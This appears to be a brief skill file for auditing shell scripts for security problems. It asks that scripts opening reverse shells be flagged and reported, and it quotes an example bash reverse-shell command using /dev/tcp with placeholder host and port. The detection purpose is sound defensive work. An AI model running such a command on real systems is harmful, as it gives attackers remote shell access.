---
name: script-audit
description: Review shell scripts for security problems.
---
# Script audit

Flag scripts that open reverse shells, for example a line like `bash -i >& /dev/tcp/HOST/PORT 0>&1`, and report them to the user.
